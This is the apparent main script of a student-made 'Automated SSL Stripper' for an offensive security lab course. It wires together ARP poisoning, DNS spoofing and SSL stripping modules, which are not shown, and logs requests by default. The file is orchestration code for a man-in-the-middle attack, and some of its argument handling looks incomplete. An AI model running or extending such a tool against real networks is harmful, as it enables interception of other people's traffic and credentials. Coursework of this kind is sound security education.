import sys
import signal
import threading
from termcolor import colored
from scripts.arp_poisoner import ArpPoisoner
from scripts.dns_spoofer import DnsSpoofer
from scripts.ssl_stripper import SslStripper

VERSION = "1.0"

CONFIG = {
    "arp": {
        "target": None,
        "gateway": None,
        "interval": 30,  # Interval in seconds between ARP requests for ARP spoofing
        "ignore_cache": False  # Ignore ARP cache when looking up MAC addresses
    },
    "dns": {
        "disable": True,  # Disable DNS spoofing
        "hosts": None,
        "target": None  # IP address the packets are redirected to
    },
    "ssl": {
        "disable": False,  # Disable SSL stripping
        "logging": True,  # Log all requests to a log file
        "port": 80  # Port to listen for spoofed webserver traffic
    }
}


def parse_args():
    # Catch help and version arguments
    if sys.argv[1:].__contains__("-h") or sys.argv[1:].__contains__("--help"):
        print("Automated SSL Stripper.")
        print("Usage: python3 main.py [options]")
        sys.exit(0)
    if sys.argv[1:].__contains__("-v") or sys.argv[1:].__contains__("--version"):
        print("Version: {}".format(VERSION))
        sys.exit(0)

    args = [[sys.argv[i], sys.argv[i + 1]] for i in range(1, len(sys.argv) - 1)
            if sys.argv[i].startswith("-")
            and sys.argv[i + 1] != "-h" and sys.argv[i + 1] != "--help"
            and sys.argv[i + 1] != "-v" and sys.argv[i + 1] != "--version"]

    try:
        for i, arg in enumerate(args):
            if arg[0] == "-t":
                CONFIG["arp"]["target"] = arg[1]
            elif arg[0] == "-aI":
                value = int(arg[1])
                if value < 1:
                    print("Error: Invalid value for argument '{}': '{}'".format(arg[0], arg[1]))
                    sys.exit(1)
                CONFIG["arp"]["interval"] = value
            elif arg[0] == "-aC":
                CONFIG["arp"]["ignore_cache"] = True
            elif arg[0] == "-d":
                hosts_file = open(arg[1].encode('unicode_escape'), "r")
                content = hosts_file.readlines()
                hosts_list = []
                for j in content:
                    hosts_list.append(j.rstrip('\n'))
                CONFIG["dns"]["hosts"] = hosts_list
                CONFIG["dns"]["disable"] = False
            elif arg[0] == "-dt":
                CONFIG["dns"]["target"] = arg[1]
            elif arg[0] == "-sD":
                CONFIG["ssl"]["disable"] = True
            elif arg[0] == "-sL":
                CONFIG["ssl"]["logging"] = False
            elif arg[0] == "-sP":
                CONFIG["ssl"]["port"] = int(arg[1])
            else:
                print("Error: Unknown argument '{}': '{}'".format(arg[0], arg[1]))
                print("Use -h or --help for usage information.")
                sys.exit(1)
    except ValueError:
        print("Error: Invalid value for argument '{}': '{}'".format(args[i][0], args[i][1]))
        sys.exit(1)


def print_art():
    logo = """
  _______  _    _     __    
 |__   __|| |  | |   / /    
    | |   | |  | |  / /___  
    | |   | |  | | / // _ \\ 
    | |   | |__| |/ /|  __/ 
    |_|    \\____//_/  \\___| 
                            
    """

    seperator = """
    
        
        
  _____ 
 |_____|
        
        
    """

    title = """

  ____  ____   _       ____   _          _                           
 / ___|/ ___| | |     / ___| | |_  _ __ (_) _ __   _ __    ___  _ __ 
 \\___ \\\\___ \\ | |     \\___ \\ | __|| '__|| || '_ \\ | '_ \\  / _ \\| '__|
  ___) |___) || |___   ___) || |_ | |   | || |_) || |_) ||  __/| |   
 |____/|____/ |_____| |____/  \\__||_|   |_|| .__/ | .__/  \\___||_|   
                                           |_|    |_|                
    """

    art = '\n'.join(' '.join(pair) for pair in zip(*(s.split('\n') for s in (logo, seperator, title))))

    print(colored(art, "light_red"))


def print_welcome():
    print_art()

    print(colored("Automated SSL Stripper", "light_green") + " by " +
          colored("group 13", "blue") + " made for the course " +
          colored("2IC80 - Lab on Offensive Computer Security", "red") + ".")
    print("Version: {}\n".format(VERSION))


def start():
    try:
        target_ip = CONFIG["arp"]["target"]
        poisoning_interval = CONFIG["arp"]["interval"]
        gateway_ip = CONFIG["arp"]["gateway"]
        ignore_cache = CONFIG["arp"]["ignore_cache"]

        # Set configuration for ARP poisoning
        arp_poisoner = ArpPoisoner(target_ip, gateway_ip, poisoning_interval, ignore_cache)

        # Register signal handler
        signal.signal(signal.SIGINT, lambda sig, frame: arp_poisoner.undo() or sys.exit(0))

        # Run ARP poisoning script with configured parameters
        arp_poisoner.start()

        disable_dns = CONFIG["dns"]["disable"]

        # Run DNS poisoning script with configured parameters
        if not disable_dns:
            dns_hosts = CONFIG["dns"]["hosts"]
            dns_target = CONFIG["dns"]["target"]

            dns_poisoner = DnsSpoofer(dns_hosts, dns_target)
            dns_thread = threading.Thread(target=lambda: dns_poisoner.start())
            dns_thread.daemon = True
            dns_thread.start()

            disable_ssl = CONFIG["ssl"]["disable"]

            # Run SSL stripping script with configured parameters
            if not disable_ssl and not dns_target:  # Only run SSL stripper if DNS redirects to this machine
                ssl_port = CONFIG["ssl"]["port"]
                logging = CONFIG["ssl"]["logging"]

                ssl_stripper = SslStripper(ssl_port, logging)
                ssl_thread = threading.Thread(target=lambda: ssl_stripper.start())
                ssl_thread.daemon = True
                ssl_thread.start()

        while True:  # Keep the program running
            pass
    except KeyboardInterrupt:
        print("[!] Exiting...")


if __name__ == '__main__':
    parse_args()
    print_welcome()
    start()
